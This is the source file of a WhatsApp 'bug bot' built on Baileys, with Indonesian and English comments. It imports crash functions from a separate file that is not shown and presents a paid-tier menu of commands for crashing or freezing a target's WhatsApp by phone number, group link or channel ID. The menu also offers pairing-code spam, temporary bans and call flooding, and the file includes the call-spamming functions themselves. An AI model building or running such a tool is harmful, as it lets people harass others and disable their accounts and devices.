/*

€ Creator: Tama Ryuichi
€ Base: Tama Ryuichi
*Social Media*
 Github: https://github.com/Tama-Ryuichi
 Youtube: https://youtube.com/@tamainfinity
 Telegram: https://t.me/tamainfinity
 
<!> 
#Creator ( Tama Ryuichi )
©2024 - Tama

ini adalah base bot whatsapp simple buatanku jadi pakai aja kalau kamu tertarik.


#Developer ( Tama Ryuichi )
©2024 - Tama

This is my simple WhatsApp bot base, so feel free to use it if you're interested.

Don't Remove This Credits

*/
require('./settings/config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./system/storage')
const { protocolbug1, protocolbug2, protocolbug3, protocolbug5, protocolbug6, protocolbug7, protocolbug8, bulldozer, invisxaudio, invisxlocation, NewStellarStuck, CrashIOS, invico2, letterCrash, StickerPack6, StallerPackFreze, ChannelCrash1, ChannelCrash2, ChannelCrash3, XMLUI } = require('./TraVZap/XczvZap')

module.exports = client = async (client, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./system/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./system/premium.json'))
const Vip = JSON.parse(fs.readFileSync('./system/vip.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await client.decodeJid(client.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isVip = [botNumber, ...Vip].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await client.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

if (!client.public) {
if (!isCreator) return
}

if (command) {
  if (m.isGroup) {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  } else {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  }
}
//=================================================//
// Function Main — Menu
//=================================================//
const ThumbUrl = "https://j.top4top.io/p_3319xbxss1.jpeg"
const X1 = fs.readFileSync(`./system/image/X1.jpeg`)
const X2 = fs.readFileSync(`./system/image/X2.jpeg`)
const X3 = fs.readFileSync(`./system/image/X3.jpeg`)
const X4 = fs.readFileSync(`./system/image/X4.jpeg`)
const XXX = [X1, X2, X3, X4]
const randomIndex = Math.floor(Math.random() * XXX.length)
const ImageRandomX = XXX[randomIndex]		
const imageList = [
"https://files.catbox.moe/vfoei7.jpg",
"https://files.catbox.moe/stbpaa.jpg"
];

const imageList2 = [
"https://files.catbox.moe/hrqbb1.jpg",
"https://files.catbox.moe/tnv3d6.jpg",
"https://files.catbox.moe/wj5517.jpg"

];

const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];
const RandomShort = imageList2[Math.floor(Math.random() * imageList2.length)];

const example = (teks) => {
return `Usage: ${prefix + command} ${teks}`
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: ImageRandomX,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "",
      message: `—!s\`RizxVelz🫀\n𝐕͢𝐞͡𝐫⍣𝐬͢𝐢͠𝐨᷼𝐧 𝟔.𝟑 𝐅͢𝐫͡𝐞𝐞`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
  
const ReplyMultiMenu = async (teks) => {
  const userMode = global.menuMode || 'nobutton'; // default button

  if (userMode === 'nobutton') {
    const buttonMessage = {
      image: { url: RandomMenu },
      caption: teks,
      footer: '© િ፷𝑹̶𝒊̈́͟𝒛𝒙̶ᐁ𝑽𝒆̽͢𝒍𝒛𝑶̽𝒇𝒇𝒊𝒄𝒊𝒂𝒍፮▾ ༑̴⟆̊',
      headerType: 6,
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363319314627296@newsletter",
          serverMessageId: null,
          newsletterName: `🩸⃟༑⌁⃰𝐙͢𝐨𝐫𝐨 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️`
        },
        externalAdReply: {
          showAdAttribution: true,
          title: `𝐙͢𝐎͡𝐑⍣𝐎 𝐒͢𝐋͡𝐈⍣𝐄͢𝐍͠𝐓 - 𝐑͢𝐈͡𝐙⍣𝐗͢𝐕͠𝐄᷼𝐋𝐙`,
          body: `𝐕͢𝐞͡𝐫⍣𝐬͢𝐢͠𝐨᷼𝐧 𝟔.𝟑 𝐅͢𝐫͡𝐞𝐞`,
          mediaType: 1,
          renderLargerThumbnail: false,
          thumbnailUrl: RandomShort,
          sourceUrl: "https://crash.whatsapp.api.rizxvelz.free"
        },
        mentionedJid: [m.sender],
      },
      viewOnce: false
    };

    return await client.sendMessage(m.chat, buttonMessage, { quoted: lol });
  }

  // BUTTON MODE
const buttonMessage = {
  image: { url: RandomMenu },
  caption: teks,
  footer: 'િ፷𝑹̶𝒊̈́͟𝒛𝒙̶ᐁ𝑽𝒆̽͢𝒍𝒛𝑶̽𝒇𝒇𝒊𝒄𝒊𝒂𝒍፮▾ ༑̴⟆',
  headerType: 6,
  contextInfo: {
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363319314627296@newsletter",
      serverMessageId: null,
      newsletterName: `🩸⃟༑⌁⃰𝐙͢𝐨𝐫𝐨 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️`
    },
    externalAdReply: {
      showAdAttribution: true,
      title: `𝐙͢𝐎͡𝐑⍣𝐎 𝐒͢𝐋͡𝐈⍣𝐄͢𝐍͠𝐓 - 𝐑͢𝐈͡𝐙⍣𝐗͢𝐕͠𝐄᷼𝐋𝐙`,
      body: `𝐕͢𝐞͡𝐫⍣𝐬͢𝐢͠𝐨᷼𝐧 𝟔.𝟑 𝐅͢𝐫͡𝐞𝐞`,
      mediaType: 1,
      renderLargerThumbnail: false,
      thumbnailUrl: RandomShort,
      sourceUrl: "https://crash.whatsapp.api.rizxvelz.free"
    },
    mentionedJid: [m.sender]
  },
  viewOnce: true
};

// nativeFlowButton sebagai tombol list
const nativeFlowButton = {
  buttonId: 'menu',
  buttonText: { displayText: 'Open Menu ☇' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "Select ☇ Menu",
      sections: [
        {
          title: "⌜ 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ⌟",
          rows: [
            {
              header: "Owner Menu",
              title: "ᨒ",
              description: "›› menampilkan owner menu",
              id: `.ownmenu`
            },
            {
              header: "Main Menu",
              title: "ϟ",
              description: "›› menampilkan main menu",
              id: `.mainmenu`
            },
            {
              header: "Xowner",
              title: "𐁘",
              description: "",
              id: `.xowner`
            }
          ]
        },
        {
          title: "⌜ 𝐓𝐡𝐞 𝐙𝐨𝐫𝐨 𝐂𝐫𝐚𝐬𝐡🐉 ⌟ ",
          rows: [
            {
              header: "Bug Menu",
              title: "⍣",
              description: "›› menampilkan bug menu",
              id: `.xbug`
            }
          ]
        },
        {
          title: "⌜ 𝚯𝐭𝐡𝐞𝐫𝐬🎭 ⌟",
          rows: [
            {
              header: "Thanks To",
              title: "𐁘",
              description: "",
              id: `.tqto`
            }
          ]
        }
      ]
    })
  }
};

return await client.sendMessage(m.chat, {
  ...buttonMessage,
  buttons: [nativeFlowButton]
}, { quoted: lol });
}

const ReplyMulti = async (teks) => {
  const userMode = global.menuMode || 'nobutton'; // default button

  if (userMode === 'nobutton') {
    const buttonMessage = {
      image: { url: RandomMenu },
      caption: teks,
      footer: '© િ፷𝑹̶𝒊̈́͟𝒛𝒙̶ᐁ𝑽𝒆̽͢𝒍𝒛𝑶̽𝒇𝒇𝒊𝒄𝒊𝒂𝒍፮▾ ༑̴⟆̊',
      headerType: 6,
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363319314627296@newsletter",
          serverMessageId: null,
          newsletterName: `🩸⃟༑⌁⃰𝐙͢𝐨𝐫𝐨 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️`
        },
        externalAdReply: {
          showAdAttribution: true,
          title: `𝐙͢𝐎͡𝐑⍣𝐎 𝐒͢𝐋͡𝐈⍣𝐄͢𝐍͠𝐓 - 𝐑͢𝐈͡𝐙⍣𝐗͢𝐕͠𝐄᷼𝐋𝐙`,
          body: `𝐕͢𝐞͡𝐫⍣𝐬͢𝐢͠𝐨᷼𝐧 𝟔.𝟑 𝐅͢𝐫͡𝐞𝐞`,
          mediaType: 1,
          renderLargerThumbnail: false,
          thumbnailUrl: RandomShort,
          sourceUrl: "https://crash.whatsapp.api.rizxvelz.free"
        },
        mentionedJid: [m.sender],
      },
      viewOnce: false
    };

    return await client.sendMessage(m.chat, buttonMessage, { quoted: lol });
  }

  // BUTTON MODE
  const buttons = [
    {
      buttonId: '.menu',
      buttonText: {
        displayText: 'Menu'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: 'િ፷𝑹̶𝒊̈́͟𝒛𝒙̶ᐁ𝑽𝒆̽͢𝒍𝒛𝑶̽𝒇𝒇𝒊𝒄𝒊𝒂𝒍፮▾ ༑̴⟆',
    buttons: buttons,
    headerType: 6,
    contextInfo: {
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363319314627296@newsletter",
        serverMessageId: null,
        newsletterName: `🩸⃟༑⌁⃰𝐙͢𝐨𝐫𝐨 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️`
      },
      externalAdReply: {
        showAdAttribution: true,
        title: `𝐙͢𝐎͡𝐑⍣𝐎 𝐒͢𝐋͡𝐈⍣𝐄͢𝐍͠𝐓 - 𝐑͢𝐈͡𝐙⍣𝐗͢𝐕͠𝐄᷼𝐋𝐙`,
        body: `𝐕͢𝐞͡𝐫⍣𝐬͢𝐢͠𝐨᷼𝐧 𝟔.𝟑 𝐅͢𝐫͡𝐞𝐞`,
        mediaType: 1,
        renderLargerThumbnail: false,
        thumbnailUrl: RandomShort,
        sourceUrl: "https://crash.whatsapp.api.rizxvelz.free"
      },
      mentionedJid: [m.sender],
    },
    viewOnce: true
  };
  
  return await client.sendMessage(m.chat, buttonMessage, { quoted: lol });
};

async function sendOfferCall(client, target) {
    try {
        await client.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}
async function sendOfferVideoCall(client, target) {
    try {
        await client.offerCall(target, {
            callType: 'video' // Ganti 'audio' ke 'video'
        });
        console.log(chalk.white.bold(`Success Send Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Video Call To Target:`), error);
    }
}

const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;
//=================================================//
// Command Menu
//=================================================//
switch(command) {
case 'setmenu': {
  if (!isCreator) return ReplyMulti(mess.owner);
  const selected = args[0]?.toLowerCase();
  if (!['button', 'nobutton'].includes(selected)) {
    return ReplyMulti(`*Usage :*\n.setmenu button\n.setmenu nobutton`);
  }

  global.menuMode = selected; // Ubah global, bukan per user
  return ReplyMulti(`✅ Tampilan menu semua user telah diubah ke *${selected.toUpperCase()}* mode.`);
}
break
case 'start':
case 'help':
case 'menu': {
let Menu = `──( 🇬🇧 ) - Hello, ${info}!💐
────────────────────────
「 𝐙͢𝐎͡𝐑⍣𝐎 ☇ 𝟔.𝟑-𝐕͢𝐈͡𝐏 」
⬡ Owner Name : Rizxvelz Official〽️
⬡ Version : 6.3-Vip
⬡ Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
⬡ Online : ${runtime(process.uptime())}
${readmore}
──( Menu )
›› .xbug
›› .ownermenu
›› .mainmenu
┈┈┈┈┈┈┈┈┈┈✧

──( Others )
›› .setmenu
›› .xowner
›› .tqto
┈┈┈┈┈┈┈┈┈┈✧`;
ReplyMultiMenu(Menu)
}
break
case 'owmermenu':
case 'ownmenu': {
let Menu = `──( 🇬🇧 ) - Hello, ${info}!💐
────────────────────────
「 𝐙͢𝐎͡𝐑⍣𝐎 ☇ 𝟔.𝟑-𝐕͢𝐈͡𝐏 」
⬡ Owner Name : Rizxvelz Official〽️
⬡ Version : 6.3-Vip
⬡ Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
⬡ Online : ${runtime(process.uptime())}
${readmore}
──( Owner Menu )
›› .addown
›› .delown
›› .addprem
›› .delprem
›› .addvip
›› .delvip
›› .public
›› .self
›› .restart
›› .hidetag
›› .join
›› .>
›› .<
›› .$
┈┈┈┈┈┈┈┈┈┈✧`;
ReplyMultiMenu(Menu)
}
break
case 'mainmenu':
case 'menumain': {
let Menu = `──( 🇬🇧 ) - Hello, ${info}!💐
────────────────────────
「 𝐙͢𝐎͡𝐑⍣𝐎 ☇ 𝟔.𝟑-𝐕͢𝐈͡𝐏 」
⬡ Owner Name : Rizxvelz Official〽️
⬡ Version : 6.3-Vip
⬡ Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
⬡ Online : ${runtime(process.uptime())}
${readmore}
──( Main Menu )
›› .cekidch
›› .reactch
›› .rvo
›› .tourl
›› .sticker
┈┈┈┈┈┈┈┈┈┈✧`;
ReplyMultiMenu(Menu)
}
break;
case 'menubug':
case 'xbug':
case 'bugmenu': {
let Menu = `──( 🇬🇧 ) - Hello, ${info}!💐
────────────────────────
「 𝐙͢𝐎͡𝐑⍣𝐎 ☇ 𝟔.𝟑-𝐕͢𝐈͡𝐏 」
⬡ Owner Name : Rizxvelz Official〽️
⬡ Version : 6.3-Vip
⬡ Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}
⬡ Online : ${runtime(process.uptime())}
${readmore}
──( Premium )
›› .bulldozer 628xx
›› .invisxaudio 628xx
›› .invisxlocation 628xx
›› .protocolbug1 628xx
›› .protocolbug2 628xx
›› .protocolbug3 628xx
›› .protocolbug5 628xx
›› .protocolbug6 628xx
›› .protocolbug7 628xx
›› .protocolbug8 628xx
┈┈┈┈┈┈┈┈┈┈✧

──( Vvip )
›› .xblank 628xx
›› .xmlcrash 628xx
›› .crashios 628xx
›› .xgroup chat.whatsapp.com
›› .xjids id@newsletter
┈┈┈┈┈┈┈┈┈┈✧

──( XxOthers )
›› .spampair 628xx|100
›› .tempban 628xx
›› .spamcall 628xx
›› .spamvidcall 628xx
┈┈┈┈┈┈┈┈┈┈✧`
ReplyMultiMenu(Menu)
}
break;
case 'tqto': {
let Menu = `──( 🇬🇧 ) - Hello, ${info}!💐
╰➤ I'am an Zoro bot made by RizxVelz, which is designed to help you
────────────────────────

╭──────「 \`Thanks-To\` 」
│▢ RizxVelz Official *<Dev\`Script>*
│▢ RaldzzXyz *<My\`Friend>*
│▢ WaysModzz *<My\`Friend>*
│▢ LieeGanteng *<My\`Friend>*
│▢ Rizz official *<My\`Friend>*
│▢ Deruhu Forever *<My\'Friend>*
│▢ TheDitchie *<My\'Friend>*
│▢ DitzzOfficial *<My\'Friend>*
│▢ Arise Official *<My\'Friend>*
│▢ PAPA•QUEEN亗 *<My\'Friend>*
│▢ NeXiRo OffC *<My\'Friend>*
│▢ EvilCyt Offc *<My\'Friend>*
│▢ RizzNotDev *<My\'Friend>*
│▢ Flux *<My\'Friend>*
│▢ RyzzIsHere *<My\'Friend>*
│▢ SanzXD Official *<My\`Friend>*
│▢ danzoo *<My\`Friend>*
│▢ Denny *<My\'Friend>*
│▢ yukina Devils *<My\'Friend>*
╰────────────────────╯`
ReplyMultiMenu(Menu)
}
//=================================================//
// Command Owner
//=================================================//

break;

case 'addowner':
case 'addown': {
    if (!isCreator) return ReplyMulti(mess.owner);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyMulti(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let checkNumber = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return ReplyMulti("Nomor tidak valid di WhatsApp!");

    if (!owner.includes(number)) owner.push(number);
    if (!Premium.includes(number)) Premium.push(number);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
    ReplyMulti(`✅ Berhasil menambahkan *@${number}* sebagai Owner`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delowner':
case 'delown': {
    if (!isCreator) return ReplyMulti(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyMulti(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
    ReplyMulti(`❌ Owner *@${number}* berhasil dihapus.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'addpremium':
case 'addprem': {
    if (!isCreator) return ReplyMulti(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyMulti(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return ReplyMulti("Nomor tidak valid!");

    if (!Premium.includes(number)) Premium.push(number);
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    ReplyMulti(`✅ *@${number}* berhasil jadi user premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delpremium':
case 'delprem': {
    if (!isCreator) return ReplyMulti(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyMulti(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let index = Premium.indexOf(number);
    if (index !== -1) {
        Premium.splice(index, 1);
        fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
        ReplyMulti(`❌ *@${number}* telah dihapus dari daftar premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    } else {
        ReplyMulti(`⚠️ *@${number}* tidak terdaftar sebagai premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    }
}
break;

case 'addvip':
case 'addvvip': {
    if (!isCreator) return ReplyMulti(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyMulti(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return ReplyMulti("Nomor tidak valid!");

    if (!Vip.includes(number)) Vip.push(number);
    fs.writeFileSync('./system/vip.json', JSON.stringify(Vip));

    ReplyMulti(`✅ *@${number}* berhasil jadi user vip.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delvip':
case 'delvvip': {
    if (!isCreator) return ReplyMulti(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyMulti(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let index = Vip.indexOf(number);
    if (index !== -1) {
        Vip.splice(index, 1);
        fs.writeFileSync('./system/vip.json', JSON.stringify(Vip));
        ReplyMulti(`❌ *@${number}* telah dihapus dari daftar vip.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    } else {
        ReplyMulti(`⚠️ *@${number}* tidak terdaftar sebagai vip.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    }
}
break;
case 'public': {
    if (!isCreator) return ReplyMulti(mess.owner);
    client.public = true;
    ReplyMulti("Successfully changed mode to public.");
}
break;

case 'private': case 'self': {
    if (!isCreator) return ReplyMulti(mess.owner);
    client.public = false;
    ReplyMulti("Successfully changed mode to self.");
}
break
case "restart": {
    if (!isCreator) return ReplyMulti(mess.owner);

    ReplyMulti("Restarting Bot.....");

    // Delay 3 detik lalu keluar
    setTimeout(() => {
        process.exit(1);
    }, 3000);
}
//=================================================//
// Command Main
//=================================================//
break

case "cekidch": case "idch": {
if (!text) return ReplyMulti(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return ReplyMulti("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await client.newsletterMetadata("invite", result)
let teks = `${res.id}
`
return ReplyMulti(teks)
}
break
case "reactch": {
 if (!text || !args[0] || !args[1]) 
 return ReplyMulti(example("linkch 😐"));
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return ReplyMulti("Link tautan tidak valid")
 let result = args[0].split('/')[4]
 let serverId = args[0].split('/')[5]
 let res = await client.newsletterMetadata("invite", result) 
 await client.newsletterReactMessage(res.id, serverId, args[1])
 ReplyMulti(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break;

case "rvo":
case "readvo":
case 'readviewonce':
